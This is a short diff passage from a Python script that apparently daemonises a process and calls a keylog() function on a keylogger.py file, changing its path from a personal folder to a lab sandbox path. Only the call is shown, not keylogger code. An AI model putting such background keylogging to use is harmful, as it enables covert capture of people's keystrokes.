@@ -213,7 +213,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
         
     #I am the child connection, I am an evil fork and shouldn't HUP
    # Flush I/O  buffers  and lockdown stderr/out/in
-    keylog("/home/michael/sandbox/project/mine/keylogger.py")
+    keylog("/home/lab/sandbox/keylogger.py")
     sys.stdout.flush() 
     sys.stderr.flush()
     
